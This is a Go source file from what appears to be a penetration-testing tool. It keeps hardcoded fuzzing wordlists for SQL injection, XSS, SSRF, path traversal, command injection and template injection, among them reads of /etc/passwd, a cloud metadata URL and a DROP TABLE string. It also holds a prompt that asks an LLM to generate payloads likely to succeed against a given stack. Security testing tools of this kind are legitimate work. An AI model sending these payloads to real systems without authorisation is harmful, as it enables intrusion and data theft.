package siegeengine

import (
	"fmt"
	"strings"

	"github.com/templar-framework/templar/internal/shared/llm"
)

// fallbackWordlists provides minimal hardcoded payloads per injection class,
// used when the LLM is unavailable.
var fallbackWordlists = map[string][]string{
	"sqli": {
		"'",
		"''",
		"' OR '1'='1",
		"' OR 1=1--",
		"\" OR \"1\"=\"1",
		"1; DROP TABLE users--",
		"1 UNION SELECT NULL--",
		"' AND SLEEP(5)--",
	},
	"xss": {
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"'><script>alert(document.cookie)</script>",
		"\"><img src=x onerror=alert(1)>",
	},
	"ssrf": {
		"http://127.0.0.1",
		"http://localhost",
		"http://169.254.169.254/latest/meta-data/",
		"http://[::1]",
		"file:///etc/passwd",
		"dict://127.0.0.1:6379/info",
	},
	"lfi": {
		"../etc/passwd",
		"../../etc/passwd",
		"../../../etc/passwd",
		"....//....//etc/passwd",
		"%2e%2e%2fetc%2fpasswd",
		"..%2F..%2Fetc%2Fpasswd",
		"/etc/passwd",
	},
	"rce": {
		"; id",
		"| id",
		"&& id",
		"`id`",
		"$(id)",
		"; cat /etc/passwd",
		"| whoami",
	},
	"ssti": {
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"{{config}}",
		"{{self.__class__.__mro__[1].__subclasses__()}}",
	},
}

// GenerateWordlist calls the LLM with role "analysis" to generate a smart,
// context-aware fuzzing wordlist for the given injection class and tech stack.
// If the LLM call fails, it falls back to a hardcoded minimal wordlist.
func GenerateWordlist(llmClient *llm.LLMClient, injectionClass string, techStack string) ([]string, error) {
	prompt := buildWordlistPrompt(injectionClass, techStack)

	response, err := llmClient.Call("analysis", prompt)
	if err != nil {
		// LLM unavailable — use fallback wordlist
		return fallbackForClass(injectionClass), nil
	}

	payloads := parseWordlistResponse(response)
	if len(payloads) == 0 {
		// LLM returned an unparseable response — use fallback
		return fallbackForClass(injectionClass), nil
	}

	return payloads, nil
}

// buildWordlistPrompt constructs the LLM prompt for wordlist generation.
func buildWordlistPrompt(injectionClass string, techStack string) string {
	return fmt.Sprintf(
		"You are a penetration testing assistant specializing in web application security.\n\n"+
			"Generate a smart fuzzing wordlist for the following injection class and technology stack.\n\n"+
			"Injection class: %s\n"+
			"Technology stack: %s\n\n"+
			"Requirements:\n"+
			"- Output one payload per line\n"+
			"- Include payloads that are most likely to succeed against the given tech stack\n"+
			"- Include both common/known payloads and less obvious variants\n"+
			"- Include encoding variations where relevant (URL encoding, HTML entities, etc.)\n"+
			"- Do NOT include explanations, headers, or any text other than the raw payloads\n"+
			"- Aim for 20-50 high-quality payloads\n\n"+
			"Output the payloads now, one per line:",
		injectionClass,
		techStack,
	)
}

// parseWordlistResponse parses an LLM response into a slice of payload strings.
// Each non-empty line is treated as one payload.
func parseWordlistResponse(response string) []string {
	var payloads []string
	for _, line := range strings.Split(response, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		// Skip lines that look like explanatory text (starting with common prose markers)
		if strings.HasPrefix(trimmed, "#") ||
			strings.HasPrefix(trimmed, "//") ||
			strings.HasPrefix(trimmed, "Note:") ||
			strings.HasPrefix(trimmed, "Here") {
			continue
		}
		payloads = append(payloads, trimmed)
	}
	return payloads
}

// fallbackForClass returns the hardcoded minimal wordlist for the given injection
// class, or a generic set of probe payloads if the class is unrecognized.
func fallbackForClass(injectionClass string) []string {
	normalized := strings.ToLower(strings.TrimSpace(injectionClass))
	if list, ok := fallbackWordlists[normalized]; ok {
		return list
	}

	// Generic fallback for unrecognized injection classes
	return []string{
		"'",
		"\"",
		"<script>alert(1)</script>",
		"../etc/passwd",
		"; id",
		"{{7*7}}",
		"http://127.0.0.1",
	}
}
